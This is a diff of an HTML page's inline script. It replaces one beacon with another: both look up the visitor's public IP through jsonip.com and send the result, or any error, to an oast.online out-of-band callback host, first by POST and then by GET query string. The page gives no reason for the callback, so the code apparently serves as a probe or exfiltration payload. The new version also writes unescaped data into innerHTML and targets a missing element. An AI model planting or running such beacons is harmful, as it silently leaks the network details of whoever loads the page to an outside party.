@@ -5,46 +5,25 @@
   <div id="result1"></div>
   
   <script>
-     fetch("https://jsonip.com")
-    .then(async r => {
-      const body = await r.text();
-  
-      const data = {
-        type: "success",
-        status: r.status,
-        responseType: r.type,
-        body: body
-      };
-  
-      document.getElementById("result1").textContent =
-        JSON.stringify(data, null, 2);
-  
-      fetch("https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-      });
-    })
-    .catch(err => {
-      const data = {
-        type: "error",
-        error: String(err),
-        message: err?.message || null
-      };
-  
-      document.getElementById("result1").textContent =
-        JSON.stringify(data, null, 2);
-  
-      fetch("https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-      });
-    });
+     async function getData() {
+       
+      const url = "https://jsonip.com";
+       
+      try {
+        const response = await fetch(url);
+        if (!response.ok) {
+          throw new Error(`Response status: ${response.status}`);
+        }
+        
+        const result = await response.json();
+         document.getElementById("result").innerHTML = result;
+        fetch(`https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/?q=${result}`)
+      } 
+      catch (error) {
+         document.getElementById("result").innerHTML = error;
+         fetch(`https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/?q=${error}`)
+      }
+     }
    
   </script>
 
